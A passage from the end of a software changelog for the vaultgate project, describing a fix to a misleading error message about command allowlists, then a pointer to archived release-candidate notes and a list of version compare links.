  hand-made request that did was saved as an ordinary restricted target, and the same request with
  an empty command allowlist was answered "give at least one command pattern, or set any_command",
  advising the operator to do the very thing the deployment forbids. The switch could never be
  defeated, so this was an honesty defect rather than a security one, but the service's own
  refusal was unreachable on the only path that writes a target. Found by the M12 live test.

## Earlier releases

Release candidates 0.1.0-rc.1 to 0.1.0-rc.9 are in
[`docs/changelog-archive.md`](docs/changelog-archive.md). They are kept verbatim; this file holds
the current release and the ones after it, so it stays inside the repository's 64 KiB file gate.

[Unreleased]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.20...HEAD
[0.1.0-rc.20]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.19...v0.1.0-rc.20
[0.1.0-rc.19]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.18...v0.1.0-rc.19
[0.1.0-rc.18]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.17...v0.1.0-rc.18
[0.1.0-rc.17]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.16...v0.1.0-rc.17
[0.1.0-rc.16]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.15...v0.1.0-rc.16
[0.1.0-rc.15]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.14...v0.1.0-rc.15
[0.1.0-rc.14]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.13...v0.1.0-rc.14
[0.1.0-rc.13]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.12...v0.1.0-rc.13
[0.1.0-rc.12]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.11...v0.1.0-rc.12
[0.1.0-rc.11]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.10...v0.1.0-rc.11
[0.1.0-rc.10]: https://github.com/adamrowles1996/vaultgate/compare/v0.1.0-rc.9...v0.1.0-rc.10
